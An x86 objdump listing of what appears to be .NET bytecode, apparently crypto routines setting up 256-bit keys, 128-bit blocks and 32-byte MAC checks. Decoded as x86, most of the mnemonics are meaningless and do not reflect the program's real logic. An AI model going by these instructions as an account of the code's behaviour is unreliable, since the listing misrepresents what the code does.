  4041a7:	20 00                	and    %al,(%eax)
  4041a9:	01 00                	add    %eax,(%eax)
  4041ab:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041ae:	00 00                	add    %al,(%eax)
  4041b0:	0a 07                	or     (%edi),%al
  4041b2:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b8:	d3 00                	roll   %cl,(%eax)
  4041ba:	00 0a                	add    %cl,(%edx)
  4041bc:	07                   	pop    %es
  4041bd:	17                   	pop    %ss
  4041be:	6f                   	outsl  %ds:(%esi),(%dx)
  4041bf:	d4 00                	aam    $0x0
  4041c1:	00 0a                	add    %cl,(%edx)
  4041c3:	07                   	pop    %es
  4041c4:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041c7:	00 00                	add    %al,(%eax)
  4041c9:	0a 07                	or     (%edi),%al
  4041cb:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041ce:	00 00                	add    %al,(%eax)
  4041d0:	04 6f                	add    $0x6f,%al
  4041d2:	d6                   	salc
  4041d3:	00 00                	add    %al,(%eax)
  4041d5:	0a 07                	or     (%edi),%al
  4041d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d8:	d7                   	xlat   %ds:(%ebx)
  4041d9:	00 00                	add    %al,(%eax)
  4041db:	0a 06                	or     (%esi),%al
  4041dd:	07                   	pop    %es
  4041de:	6f                   	outsl  %ds:(%esi),(%dx)
  4041df:	d8 00                	fadds  (%eax)
  4041e1:	00 0a                	add    %cl,(%edx)
  4041e3:	17                   	pop    %ss
  4041e4:	73 d9                	jae    0x4041bf
  4041e6:	00 00                	add    %al,(%eax)
  4041e8:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041eb:	07                   	pop    %es
  4041ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ed:	da 00                	fiaddl (%eax)
  4041ef:	00 0a                	add    %cl,(%edx)
  4041f1:	16                   	push   %ss
  4041f2:	07                   	pop    %es
  4041f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f4:	da 00                	fiaddl (%eax)
  4041f6:	00 0a                	add    %cl,(%edx)
  4041f8:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041fb:	4c                   	dec    %esp
  4041fc:	00 00                	add    %al,(%eax)
  4041fe:	0a 08                	or     (%eax),%cl
  404200:	03 16                	add    (%esi),%edx
  404202:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404208:	00 0a                	add    %cl,(%edx)
  40420a:	08 6f db             	or     %ch,-0x25(%edi)
  40420d:	00 00                	add    %al,(%eax)
  40420f:	0a 02                	or     (%edx),%al
  404211:	7b 2b                	jnp    0x40423e
  404213:	00 00                	add    %al,(%eax)
  404215:	04 73                	add    $0x73,%al
  404217:	dc 00                	faddl  (%eax)
  404219:	00 0a                	add    %cl,(%edx)
  40421b:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404220:	00 00                	add    %al,(%eax)
  404222:	0a 1f                	or     (%edi),%bl
  404224:	20 06                	and    %al,(%esi)
  404226:	6f                   	outsl  %ds:(%esi),(%dx)
  404227:	dd 00                	fldl   (%eax)
  404229:	00 0a                	add    %cl,(%edx)
  40422b:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40422e:	20 59 6f             	and    %bl,0x6f(%ecx)
  404231:	de 00                	fiadds (%eax)
  404233:	00 0a                	add    %cl,(%edx)
  404235:	13 04 06             	adc    (%esi,%eax,1),%eax
  404238:	16                   	push   %ss
  404239:	6a 6f                	push   $0x6f
  40423b:	4e                   	dec    %esi
  40423c:	00 00                	add    %al,(%eax)
  40423e:	0a 06                	or     (%esi),%al
  404240:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404243:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404246:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  40424d:	27                   	daa
  40424e:	00 00                	add    %al,(%eax)
  404250:	00 09                	add    %cl,(%ecx)
  404252:	39 06                	cmp    %eax,(%esi)
  404254:	00 00                	add    %al,(%eax)
  404256:	00 09                	add    %cl,(%ecx)
  404258:	6f                   	outsl  %ds:(%esi),(%dx)
  404259:	33 00                	xor    (%eax),%eax
  40425b:	00 0a                	add    %cl,(%edx)
  40425d:	dc 08                	fmull  (%eax)
  40425f:	39 06                	cmp    %eax,(%esi)
  404261:	00 00                	add    %al,(%eax)
  404263:	00 08                	add    %cl,(%eax)
  404265:	6f                   	outsl  %ds:(%esi),(%dx)
  404266:	33 00                	xor    (%eax),%eax
  404268:	00 0a                	add    %cl,(%edx)
  40426a:	dc 07                	faddl  (%edi)
  40426c:	39 06                	cmp    %eax,(%esi)
  40426e:	00 00                	add    %al,(%eax)
  404270:	00 07                	add    %al,(%edi)
  404272:	6f                   	outsl  %ds:(%esi),(%dx)
  404273:	33 00                	xor    (%eax),%eax
  404275:	00 0a                	add    %cl,(%edx)
  404277:	dc 06                	faddl  (%esi)
  404279:	6f                   	outsl  %ds:(%esi),(%dx)
  40427a:	dd 00                	fldl   (%eax)
  40427c:	00 0a                	add    %cl,(%edx)
  40427e:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  404284:	00 06                	add    %al,(%esi)
  404286:	39 06                	cmp    %eax,(%esi)
  404288:	00 00                	add    %al,(%eax)
  40428a:	00 06                	add    %al,(%esi)
  40428c:	6f                   	outsl  %ds:(%esi),(%dx)
  40428d:	33 00                	xor    (%eax),%eax
  40428f:	00 0a                	add    %cl,(%edx)
  404291:	dc 11                	fcoml  (%ecx)
  404293:	05 2a 00 00 00       	add    $0x2a,%eax
  404298:	01 34 00             	add    %esi,(%eax,%eax,1)
  40429b:	00 02                	add    %al,(%edx)
  40429d:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  4042a4:	00 00                	add    %al,(%eax)
  4042a6:	00 00                	add    %al,(%eax)
  4042a8:	02 00                	add    (%eax),%al
  4042aa:	6a 00                	push   $0x0
  4042ac:	74 de                	je     0x40428c
  4042ae:	00 0d 00 00 00 00    	add    %cl,0x0
  4042b4:	02 00                	add    (%eax),%al
  4042b6:	26 00 c5             	es add %al,%ch
  4042b9:	eb 00                	jmp    0x4042bb
  4042bb:	0d 00 00 00 00       	or     $0x0,%eax
  4042c0:	02 00                	add    (%eax),%al
  4042c2:	17                   	pop    %ss
  4042c3:	00 ee                	add    %ch,%dh
  4042c5:	05 01 0d 00 00       	add    $0xd01,%eax
  4042ca:	00 00                	add    %al,(%eax)
  4042cc:	1b 30                	sbb    (%eax),%esi
  4042ce:	05 00 50 01 00       	add    $0x15000,%eax
  4042d3:	00 17                	add    %dl,(%edi)
  4042d5:	00 00                	add    %al,(%eax)
  4042d7:	11 03                	adc    %eax,(%ebx)
  4042d9:	3a 0b                	cmp    (%ebx),%cl
  4042db:	00 00                	add    %al,(%eax)
  4042dd:	00 72 ce             	add    %dh,-0x32(%edx)
  4042e0:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  4042e4:	cf                   	iret
  4042e5:	00 00                	add    %al,(%eax)
  4042e7:	0a 7a 03             	or     0x3(%edx),%bh
  4042ea:	73 4d                	jae    0x404339
  4042ec:	00 00                	add    %al,(%eax)
  4042ee:	0a 0a                	or     (%edx),%cl
  4042f0:	73 d1                	jae    0x4042c3
  4042f2:	00 00                	add    %al,(%eax)
  4042f4:	0a 0b                	or     (%ebx),%cl
  4042f6:	07                   	pop    %es
  4042f7:	20 00                	and    %al,(%eax)
  4042f9:	01 00                	add    %eax,(%eax)
  4042fb:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042fe:	00 00                	add    %al,(%eax)
  404300:	0a 07                	or     (%edi),%al
  404302:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404308:	d3 00                	roll   %cl,(%eax)
  40430a:	00 0a                	add    %cl,(%edx)
  40430c:	07                   	pop    %es
  40430d:	17                   	pop    %ss
  40430e:	6f                   	outsl  %ds:(%esi),(%dx)
  40430f:	d4 00                	aam    $0x0
  404311:	00 0a                	add    %cl,(%edx)
  404313:	07                   	pop    %es
  404314:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  404317:	00 00                	add    %al,(%eax)
  404319:	0a 07                	or     (%edi),%al
  40431b:	02 7b 2a             	add    0x2a(%ebx),%bh
  40431e:	00 00                	add    %al,(%eax)
  404320:	04 6f                	add    $0x6f,%al
  404322:	d6                   	salc
  404323:	00 00                	add    %al,(%eax)
  404325:	0a 02                	or     (%edx),%al
  404327:	7b 2b                	jnp    0x404354
  404329:	00 00                	add    %al,(%eax)
  40432b:	04 73                	add    $0x73,%al
  40432d:	dc 00                	faddl  (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	0c 08                	or     $0x8,%al
  404333:	06                   	push   %es
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	1f                   	pop    %ds
  40433a:	20 06                	and    %al,(%esi)
  40433c:	6f                   	outsl  %ds:(%esi),(%dx)
  40433d:	dd 00                	fldl   (%eax)
  40433f:	00 0a                	add    %cl,(%edx)
  404341:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404344:	20 59 6f             	and    %bl,0x6f(%ecx)
  404347:	de 00                	fiadds (%eax)
  404349:	00 0a                	add    %cl,(%edx)
  40434b:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404350:	00 00                	add    %al,(%eax)
  404352:	01 13                	add    %edx,(%ebx)
  404354:	04 06                	add    $0x6,%al
  404356:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404359:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40435c:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404363:	02 09                	add    (%ecx),%cl
  404365:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404368:	50                   	push   %eax
  404369:	00 00                	add    %al,(%eax)
  40436b:	06                   	push   %es
  40436c:	3a 0b                	cmp    (%ebx),%cl
  40436e:	00 00                	add    %al,(%eax)
  404370:	00 72 fc             	add    %dh,-0x4(%edx)
  404373:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404377:	df 00                	filds  (%eax)
  404379:	00 0a                	add    %cl,(%edx)
  40437b:	7a dd                	jp     0x40435a
  40437d:	0d 00 00 00 08       	or     $0x8000000,%eax
  404382:	39 06                	cmp    %eax,(%esi)
  404384:	00 00                	add    %al,(%eax)
  404386:	00 08                	add    %cl,(%eax)
  404388:	6f                   	outsl  %ds:(%esi),(%dx)
  404389:	33 00                	xor    (%eax),%eax
  40438b:	00 0a                	add    %cl,(%edx)
  40438d:	dc 1f                	fcompl (%edi)
  40438f:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  404395:	13 05 06 11 05 16    	adc    0x16051106,%eax
  40439b:	1f                   	pop    %ds
  40439c:	10 6f 45             	adc    %ch,0x45(%edi)
  40439f:	00 00                	add    %al,(%eax)
  4043a1:	0a 26                	or     (%esi),%ah
  4043a3:	07                   	pop    %es
  4043a4:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043aa:	0a 06                	or     (%esi),%al
  4043ac:	07                   	pop    %es
  4043ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4043ae:	e1 00                	loope  0x4043b0
  4043b0:	00 0a                	add    %cl,(%edx)
  4043b2:	16                   	push   %ss
  4043b3:	73 d9                	jae    0x40438e
  4043b5:	00 00                	add    %al,(%eax)
  4043b7:	0a 13                	or     (%ebx),%dl
  4043b9:	06                   	push   %es
  4043ba:	06                   	push   %es
  4043bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4043bc:	e2 00                	loop   0x4043be
  4043be:	00 0a                	add    %cl,(%edx)
  4043c0:	1f                   	pop    %ds
  4043c1:	10 6a 59             	adc    %ch,0x59(%edx)
  4043c4:	17                   	pop    %ss
  4043c5:	6a 58                	push   $0x58
  4043c7:	d4 8d                	aam    $0x8d
  4043c9:	44                   	inc    %esp
  4043ca:	00 00                	add    %al,(%eax)
  4043cc:	01 13                	add    %edx,(%ebx)
  4043ce:	07                   	pop    %es
  4043cf:	11 06                	adc    %eax,(%esi)
  4043d1:	11 07                	adc    %eax,(%edi)
  4043d3:	16                   	push   %ss
  4043d4:	11 07                	adc    %eax,(%edi)
  4043d6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d9:	45                   	inc    %ebp
  4043da:	00 00                	add    %al,(%eax)
  4043dc:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043e2:	13 08                	adc    (%eax),%ecx
  4043e4:	11 07                	adc    %eax,(%edi)
  4043e6:	16                   	push   %ss
  4043e7:	11 08                	adc    %ecx,(%eax)
  4043e9:	16                   	push   %ss
  4043ea:	11 08                	adc    %ecx,(%eax)
  4043ec:	8e 69 28             	mov    0x28(%ecx),%gs
  4043ef:	e3 00                	jecxz  0x4043f1
  4043f1:	00 0a                	add    %cl,(%edx)
  4043f3:	11 08                	adc    %ecx,(%eax)
  4043f5:	13 09                	adc    (%ecx),%ecx
  4043f7:	dd 29                	(bad) (%ecx)
  4043f9:	00 00                	add    %al,(%eax)
  4043fb:	00 11                	add    %dl,(%ecx)
  4043fd:	06                   	push   %es
  4043fe:	39 07                	cmp    %eax,(%edi)
  404400:	00 00                	add    %al,(%eax)
  404402:	00 11                	add    %dl,(%ecx)
  404404:	06                   	push   %es
  404405:	6f                   	outsl  %ds:(%esi),(%dx)
  404406:	33 00                	xor    (%eax),%eax
  404408:	00 0a                	add    %cl,(%edx)
  40440a:	dc 07                	faddl  (%edi)
  40440c:	39 06                	cmp    %eax,(%esi)
  40440e:	00 00                	add    %al,(%eax)
  404410:	00 07                	add    %al,(%edi)
  404412:	6f                   	outsl  %ds:(%esi),(%dx)
  404413:	33 00                	xor    (%eax),%eax
  404415:	00 0a                	add    %cl,(%edx)
  404417:	dc 06                	faddl  (%esi)
  404419:	39 06                	cmp    %eax,(%esi)
  40441b:	00 00                	add    %al,(%eax)
  40441d:	00 06                	add    %al,(%esi)
  40441f:	6f                   	outsl  %ds:(%esi),(%dx)
  404420:	33 00                	xor    (%eax),%eax
  404422:	00 0a                	add    %cl,(%edx)
  404424:	dc 11                	fcoml  (%ecx)
  404426:	09 2a                	or     %ebp,(%edx)
  404428:	41                   	inc    %ecx
  404429:	64 00 00             	add    %al,%fs:(%eax)
  40442c:	02 00                	add    (%eax),%al
  40442e:	00 00                	add    %al,(%eax)
  404430:	5a                   	pop    %edx
  404431:	00 00                	add    %al,(%eax)
  404433:	00 4f 00             	add    %cl,0x0(%edi)
  404436:	00 00                	add    %al,(%eax)
  404438:	a9 00 00 00 0d       	test   $0xd000000,%eax
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 00                	add    %al,(%eax)
  404441:	00 00                	add    %al,(%eax)
  404443:	00 02                	add    %al,(%edx)
  404445:	00 00                	add    %al,(%eax)
  404447:	00 e2                	add    %ah,%dl
  404449:	00 00                	add    %al,(%eax)
  40444b:	00 42 00             	add    %al,0x0(%edx)
  40444e:	00 00                	add    %al,(%eax)
  404450:	24 01                	and    $0x1,%al
  404452:	00 00                	add    %al,(%eax)
  404454:	0f 00 00             	sldt   (%eax)
  404457:	00 00                	add    %al,(%eax)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 02                	add    %al,(%edx)
  40445d:	00 00                	add    %al,(%eax)
  40445f:	00 1e                	add    %bl,(%esi)
  404461:	00 00                	add    %al,(%eax)
  404463:	00 15 01 00 00 33    	add    %dl,0x33000001
  404469:	01 00                	add    %eax,(%eax)
  40446b:	00 0d 00 00 00 00    	add    %cl,0x0
  404471:	00 00                	add    %al,(%eax)
  404473:	00 02                	add    %al,(%edx)
  404475:	00 00                	add    %al,(%eax)
  404477:	00 18                	add    %bl,(%eax)
  404479:	00 00                	add    %al,(%eax)
  40447b:	00 28                	add    %ch,(%eax)
  40447d:	01 00                	add    %eax,(%eax)
  40447f:	00 40 01             	add    %al,0x1(%eax)
  404482:	00 00                	add    %al,(%eax)
  404484:	0d 00 00 00 00       	or     $0x0,%eax
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 13                	add    %dl,(%ebx)
  40448d:	30 03                	xor    %al,(%ebx)
  40448f:	00 22                	add    %ah,(%edx)
  404491:	00 00                	add    %al,(%eax)
  404493:	00 18                	add    %bl,(%eax)
  404495:	00 00                	add    %al,(%eax)
  404497:	11 17                	adc    %edx,(%edi)
  404499:	0a 16                	or     (%esi),%dl
  40449b:	0b 38                	or     (%eax),%edi
  40449d:	11 00                	adc    %eax,(%eax)
  40449f:	00 00                	add    %al,(%eax)
  4044a1:	03 07                	add    (%edi),%eax
  4044a3:	91                   	xchg   %eax,%ecx
  4044a4:	04 07                	add    $0x7,%al
  4044a6:	91                   	xchg   %eax,%ecx
  4044a7:	3b 02                	cmp    (%edx),%eax
  4044a9:	00 00                	add    %al,(%eax)
  4044ab:	00 16                	add    %dl,(%esi)
  4044ad:	0a 07                	or     (%edi),%al
  4044af:	17                   	pop    %ss
  4044b0:	58                   	pop    %eax
  4044b1:	0b 07                	or     (%edi),%eax
  4044b3:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b9:	2a 00                	sub    (%eax),%al
  4044bb:	00 1b                	add    %bl,(%ebx)
  4044bd:	30 03                	xor    %al,(%ebx)
  4044bf:	00 6e 00             	add    %ch,0x0(%esi)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	19 00                	sbb    %eax,(%eax)
  4044c6:	00 11                	add    %dl,(%ecx)
  4044c8:	28 19                	sub    %bl,(%ecx)
  4044ca:	00 00                	add    %al,(%eax)
  4044cc:	0a 02                	or     (%edx),%al
  4044ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4044cf:	1f                   	pop    %ds
  4044d0:	00 00                	add    %al,(%eax)
  4044d2:	0a 0a                	or     (%edx),%cl
  4044d4:	73 e5                	jae    0x4044bb
  4044d6:	00 00                	add    %al,(%eax)
  4044d8:	0a 0b                	or     (%ebx),%cl
  4044da:	07                   	pop    %es
  4044db:	06                   	push   %es
  4044dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4044dd:	8f 00                	pop    (%eax)
  4044df:	00 0a                	add    %cl,(%edx)
  4044e1:	0a dd                	or     %ch,%bl
  4044e3:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e8:	39 06                	cmp    %eax,(%esi)
  4044ea:	00 00                	add    %al,(%eax)
  4044ec:	00 07                	add    %al,(%edi)
  4044ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4044ef:	33 00                	xor    (%eax),%eax
  4044f1:	00 0a                	add    %cl,(%edx)
  4044f3:	dc 73 90             	fdivl  -0x70(%ebx)
  4044f6:	00 00                	add    %al,(%eax)
  4044f8:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044fb:	0d 16 13 04 38       	or     $0x38041316,%eax
  404500:	1f                   	pop    %ds
  404501:	00 00                	add    %al,(%eax)
  404503:	00 09                	add    %cl,(%ecx)
  404505:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404508:	13 05 08 12 05 72    	adc    0x72051208,%eax
  40450e:	52                   	push   %edx
  40450f:	27                   	daa
  404510:	00 70 28             	add    %dh,0x28(%eax)
  404513:	91                   	xchg   %eax,%ecx
  404514:	00 00                	add    %al,(%eax)
  404516:	0a 6f 92             	or     -0x6e(%edi),%ch
  404519:	00 00                	add    %al,(%eax)
  40451b:	0a 26                	or     (%esi),%ah
  40451d:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404520:	58                   	pop    %eax
  404521:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404524:	04 09                	add    $0x9,%al
  404526:	8e 69 32             	mov    0x32(%ecx),%gs
  404529:	da 08                	fimull (%eax)
  40452b:	6f                   	outsl  %ds:(%esi),(%dx)
  40452c:	38 00                	cmp    %al,(%eax)
  40452e:	00 0a                	add    %cl,(%edx)
  404530:	6f                   	outsl  %ds:(%esi),(%dx)
  404531:	94                   	xchg   %eax,%esp
  404532:	00 00                	add    %al,(%eax)
  404534:	0a 2a                	or     (%edx),%ch
  404536:	00 00                	add    %al,(%eax)
  404538:	01 10                	add    %edx,(%eax)
  40453a:	00 00                	add    %al,(%eax)
  40453c:	02 00                	add    (%eax),%al
  40453e:	12 00                	adc    (%eax),%al
  404540:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1b                	add    %bl,(%ebx)
  404549:	30 02                	xor    %al,(%edx)
  40454b:	00 22                	add    %ah,(%edx)
  40454d:	00 00                	add    %al,(%eax)
  40454f:	00 1a                	add    %bl,(%edx)
  404551:	00 00                	add    %al,(%eax)
  404553:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0a                	or     (%edx),%cl
  40455a:	06                   	push   %es
  40455b:	02 6f 8f             	add    -0x71(%edi),%ch
  40455e:	00 00                	add    %al,(%eax)
  404560:	0a 0b                	or     (%ebx),%cl
  404562:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404568:	39 06                	cmp    %eax,(%esi)
  40456a:	00 00                	add    %al,(%eax)
  40456c:	00 06                	add    %al,(%esi)
  40456e:	6f                   	outsl  %ds:(%esi),(%dx)
  40456f:	33 00                	xor    (%eax),%eax
  404571:	00 0a                	add    %cl,(%edx)
  404573:	dc 07                	faddl  (%edi)
  404575:	2a 00                	sub    (%eax),%al
  404577:	00 01                	add    %al,(%ecx)
  404579:	10 00                	adc    %al,(%eax)
  40457b:	00 02                	add    %al,(%edx)
  40457d:	00 06                	add    %al,(%esi)
  40457f:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  404585:	00 00                	add    %al,(%eax)
  404587:	00 13                	add    %dl,(%ebx)
  404589:	30 03                	xor    %al,(%ebx)
  40458b:	00 3b                	add    %bh,(%ebx)
  40458d:	00 00                	add    %al,(%eax)
  40458f:	00 1b                	add    %bl,(%ebx)
  404591:	00 00                	add    %al,(%eax)
  404593:	11 73 90             	adc    %esi,-0x70(%ebx)
  404596:	00 00                	add    %al,(%eax)
  404598:	0a 0a                	or     (%edx),%cl
  40459a:	02 0b                	add    (%ebx),%cl
  40459c:	16                   	push   %ss
  40459d:	0c 38                	or     $0x38,%al
  40459f:	1f                   	pop    %ds
  4045a0:	00 00                	add    %al,(%eax)
  4045a2:	00 07                	add    %al,(%edi)
  4045a4:	08 91 0d 06 72 58    	or     %dl,0x5872060d(%ecx)
  4045aa:	27                   	daa
  4045ab:	00 70 09             	add    %dh,0x9(%eax)
  4045ae:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045b2:	01 28                	add    %ebp,(%eax)
  4045b4:	e6 00                	out    %al,$0x0
  4045b6:	00 0a                	add    %cl,(%edx)
  4045b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b9:	92                   	xchg   %eax,%edx
  4045ba:	00 00                	add    %al,(%eax)
  4045bc:	0a 26                	or     (%esi),%ah
  4045be:	08 17                	or     %dl,(%edi)
  4045c0:	58                   	pop    %eax
  4045c1:	0c 08                	or     $0x8,%al
  4045c3:	07                   	pop    %es
  4045c4:	8e 69 32             	mov    0x32(%ecx),%gs
  4045c7:	db 06                	fildl  (%esi)
  4045c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ca:	38 00                	cmp    %al,(%eax)
  4045cc:	00 0a                	add    %cl,(%edx)
  4045ce:	2a 00                	sub    (%eax),%al
  4045d0:	13 30                	adc    (%eax),%esi
  4045d2:	03 00                	add    (%eax),%eax
  4045d4:	3b 00                	cmp    (%eax),%eax
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	1b 00                	sbb    (%eax),%eax
  4045da:	00 11                	add    %dl,(%ecx)
  4045dc:	73 90                	jae    0x40456e
  4045de:	00 00                	add    %al,(%eax)
  4045e0:	0a 0a                	or     (%edx),%cl
  4045e2:	02 0b                	add    (%ebx),%cl
  4045e4:	16                   	push   %ss
  4045e5:	0c 38                	or     $0x38,%al
  4045e7:	1f                   	pop    %ds
  4045e8:	00 00                	add    %al,(%eax)
  4045ea:	00 07                	add    %al,(%edi)
  4045ec:	08 91 0d 06 72 68    	or     %dl,0x6872060d(%ecx)
  4045f2:	27                   	daa
  4045f3:	00 70 09             	add    %dh,0x9(%eax)
  4045f6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045fa:	01 28                	add    %ebp,(%eax)
  4045fc:	e6 00                	out    %al,$0x0
  4045fe:	00 0a                	add    %cl,(%edx)
  404600:	6f                   	outsl  %ds:(%esi),(%dx)
  404601:	92                   	xchg   %eax,%edx
  404602:	00 00                	add    %al,(%eax)
  404604:	0a 26                	or     (%esi),%ah
  404606:	08 17                	or     %dl,(%edi)
  404608:	58                   	pop    %eax
  404609:	0c 08                	or     $0x8,%al
  40460b:	07                   	pop    %es
  40460c:	8e 69 32             	mov    0x32(%ecx),%gs
  40460f:	db 06                	fildl  (%esi)
  404611:	6f                   	outsl  %ds:(%esi),(%dx)
  404612:	38 00                	cmp    %al,(%eax)
  404614:	00 0a                	add    %cl,(%edx)
  404616:	2a 00                	sub    (%eax),%al
  404618:	13 30                	adc    (%eax),%esi
  40461a:	04 00                	add    $0x0,%al
  40461c:	2c 00                	sub    $0x0,%al
  40461e:	00 00                	add    %al,(%eax)
  404620:	1c 00                	sbb    $0x0,%al
  404622:	00 11                	add    %dl,(%ecx)
  404624:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  40462a:	00 01                	add    %al,(%ecx)
  40462c:	0a 02                	or     (%edx),%al
  40462e:	8e 69 17             	mov    0x17(%ecx),%gs
  404631:	59                   	pop    %ecx
  404632:	0b 16                	or     (%esi),%edx
  404634:	0c 38                	or     $0x38,%al
  404636:	0e                   	push   %cs
  404637:	00 00                	add    %al,(%eax)
  404639:	00 06                	add    %al,(%esi)
  40463b:	08 02                	or     %al,(%edx)
  40463d:	07                   	pop    %es
  40463e:	91                   	xchg   %eax,%ecx
  40463f:	9c                   	pushf
  404640:	07                   	pop    %es
  404641:	17                   	pop    %ss
  404642:	59                   	pop    %ecx
  404643:	0b 08                	or     (%eax),%ecx
  404645:	17                   	pop    %ss
  404646:	58                   	pop    %eax
  404647:	0c 08                	or     $0x8,%al
  404649:	06                   	push   %es
  40464a:	8e 69 32             	mov    0x32(%ecx),%gs
  40464d:	ec                   	in     (%dx),%al
  40464e:	06                   	push   %es
  40464f:	2a 13                	sub    (%ebx),%dl
  404651:	30 02                	xor    %al,(%edx)
  404653:	00 36                	add    %dh,(%esi)
  404655:	00 00                	add    %al,(%eax)
  404657:	00 01                	add    %al,(%ecx)
  404659:	00 00                	add    %al,(%eax)
  40465b:	11 16                	adc    %edx,(%esi)
  40465d:	0a 38                	or     (%eax),%bh
  40465f:	15 00 00 00 02       	adc    $0x2000000,%eax
  404664:	7b 38                	jnp    0x40469e
  404666:	00 00                	add    %al,(%eax)
  404668:	04 06                	add    $0x6,%al
  40466a:	6f                   	outsl  %ds:(%esi),(%dx)
  40466b:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  404672:	00 06                	add    %al,(%esi)
  404674:	06                   	push   %es
  404675:	17                   	pop    %ss
  404676:	58                   	pop    %eax
  404677:	0a 06                	or     (%esi),%al
  404679:	02 7b 38             	add    0x38(%ebx),%bh
  40467c:	00 00                	add    %al,(%eax)
  40467e:	04 6f                	add    $0x6f,%al
  404680:	eb 00                	jmp    0x404682
  404682:	00 0a                	add    %cl,(%edx)
  404684:	32 dd                	xor    %ch,%bl
  404686:	02 7b 38             	add    0x38(%ebx),%bh
  404689:	00 00                	add    %al,(%eax)
  40468b:	04 6f                	add    $0x6f,%al
  40468d:	ec                   	in     (%dx),%al
  40468e:	00 00                	add    %al,(%eax)
  404690:	0a 2a                	or     (%edx),%ch
  404692:	00 00                	add    %al,(%eax)
  404694:	13 30                	adc    (%eax),%esi
  404696:	02 00                	add    (%eax),%al
  404698:	1b 00                	sbb    (%eax),%eax
  40469a:	00 00                	add    %al,(%eax)
  40469c:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  4046a1:	94                   	xchg   %eax,%esp
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	06                   	push   %es
  4046a5:	0a 06                	or     (%esi),%al
  4046a7:	02 7d 37             	add    0x37(%ebp),%bh
  4046aa:	00 00                	add    %al,(%eax)
  4046ac:	04 02                	add    $0x2,%al
  4046ae:	7b 38                	jnp    0x4046e8
  4046b0:	00 00                	add    %al,(%eax)
  4046b2:	04 06                	add    $0x6,%al
  4046b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b5:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046ba:	2a 00                	sub    (%eax),%al
  4046bc:	1b 30                	sbb    (%eax),%esi
  4046be:	02 00                	add    (%eax),%al
  4046c0:	60                   	pusha
  4046c1:	00 00                	add    %al,(%eax)
  4046c3:	00 1e                	add    %bl,(%esi)
  4046c5:	00 00                	add    %al,(%eax)
  4046c7:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ce:	7d 00                	jge    0x4046d0
  4046d0:	00 0a                	add    %cl,(%edx)
  4046d2:	0c 02                	or     $0x2,%al
  4046d4:	7b 38                	jnp    0x40470e
  4046d6:	00 00                	add    %al,(%eax)
  4046d8:	04 6f                	add    $0x6f,%al
  4046da:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046df:	38 26                	cmp    %ah,(%esi)
  4046e1:	00 00                	add    %al,(%eax)
  4046e3:	00 12                	add    %dl,(%edx)
  4046e5:	03 28                	add    (%eax),%ebp
